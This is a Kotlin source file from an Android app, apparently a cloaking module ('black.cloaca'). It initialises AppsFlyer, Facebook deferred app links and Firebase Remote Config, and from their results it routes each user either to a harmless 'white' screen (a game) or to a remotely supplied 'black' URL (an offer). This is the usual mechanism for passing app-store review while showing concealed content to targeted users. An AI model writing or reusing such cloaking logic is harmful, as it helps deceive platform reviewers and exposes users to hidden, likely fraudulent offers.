package com.presidentserviceconsult.dimaz.black.cloaca.init_sdk

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.facebook.FacebookSdk.fullyInitialize
import com.facebook.FacebookSdk.setAutoInitEnabled
import com.facebook.applinks.AppLinkData
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.presidentserviceconsult.dimaz.black.cloaca.logic_cloaca.LogicCloaca
import com.presidentserviceconsult.dimaz.black.shared.SharedPrefs

class InitSDK(val appContext: Context, val goToWhite:()->Unit, val goToBlack:(String)->Unit ) {

    companion object{
        var responseReceived = false
    }

    fun start() {
        val status = SharedPrefs(appContext).getStatus()
        val url = SharedPrefs(appContext).getUrl()?:""
        if (status == SharedPrefs.STATUS_GO_TO_WHITE) {
            Log.d("test_cloaca_step_1", "Check saved status:  go to white")
            goToWhite()
        } else if (status == SharedPrefs.STATUS_GO_TO_BLACK) {
            Log.d("test_cloaca_step_1", "Check saved status:  go to black, saved url:${url}")
            goToBlack(url)
        } else if (status == SharedPrefs.STATUS_UNKNOWN) {
            Log.d("test_cloaca_step_1", "Check saved status:  unknow")
            appsFlyerInit()
        }
    }

  private  fun setFacebookSDK() {

        var isInitSuccessfullinkData = false

        setAutoInitEnabled(true)
        fullyInitialize()
        AppLinkData
            .fetchDeferredAppLinkData(
                appContext
            ) {
                isInitSuccessfullinkData = true
                Log.d("test_cloaca_step_3", "get link date faceBook: ${it?.targetUri ?: "null"} ")

                fireBaseRemoteConfig(
                    mapOf("compaign" to (it?.targetUri.toString()))
                )
            }
        Handler(Looper.getMainLooper()).postDelayed({
            if (!isInitSuccessfullinkData) {
                Log.d("test_cloaca_step_3", "don't get link date faceBook")

                fireBaseRemoteConfig(
                    mapOf("" to "")
                )
            }
            return@postDelayed
        }, 5_000L)

    }

  private  fun fireBaseRemoteConfig(
        namign: Map<String, String>
    ) {
        val fire = FirebaseRemoteConfig.getInstance()
        fire.fetchAndActivate()
            .addOnCompleteListener { status ->

                if (status.isSuccessful) {
                    val fireBaseUrl =
                        FirebaseRemoteConfig.getInstance().getString(SDKkey.fireBaseUrlContent)
                    val fireBaseState =
                        FirebaseRemoteConfig.getInstance().getBoolean(SDKkey.FireBaseState)
                    if (fireBaseUrl.isNotBlank()) {
                        Log.d(
                            "test_cloaca_step_4",
                            "link fireBase: ${fireBaseUrl}\n state fireBase: ${fireBaseState}"
                        )

                        LogicCloaca.logic(
                            fireBaseUrl,
                            fireBaseState,
                            namign,
                            //af_id,
                            goToWhite,
                            goToBlack
                        )
                        return@addOnCompleteListener
                    }
                }
                Log.d("test_cloaca_step_4", "link fireBase: not arrived or empty")
                goToWhite()

            }
    }


   private fun appsFlyerInit(
    ) {
        Handler(Looper.getMainLooper()).postDelayed({
            if (!responseReceived) {
                responseReceived = true
                Log.d("test_cloaca_step_2", "appsFlayer init:  not successful")
                setFacebookSDK()
            }
        }, 10000L)

        val appsFlayerListner =
            AppsFlayerListner(
                initFireBase = { namign: Map<String, String> ->
                    fireBaseRemoteConfig(
                        namign
                    )
                },
                faceBookInit = { setFacebookSDK() })

        AppsFlyerLib.getInstance().init(SDKkey.appsFlayerKey, appsFlayerListner, appContext)
        AppsFlyerLib.getInstance().start(appContext, SDKkey.appsFlayerKey, object :
            AppsFlyerRequestListener {
            override fun onSuccess() {
                if (!responseReceived) {
                    responseReceived = true
                    Log.d("test_cloaca_step_2", "appsFlayer init: successful")
                }
            }

            override fun onError(errorCode: Int, errorDesc: String) {
                if (!responseReceived) {
                    Log.d("test_cloaca_step_2", "appsFlayer init:  not successful")
                    responseReceived = true
                    setFacebookSDK()


                }
            }
        })
        AppsFlyerLib.getInstance().setDebugLog(true)
    }

}

data class ForTest(val status: STATUS, val url: String = "")
enum class STATUS {
    ToGame, ToOffer
}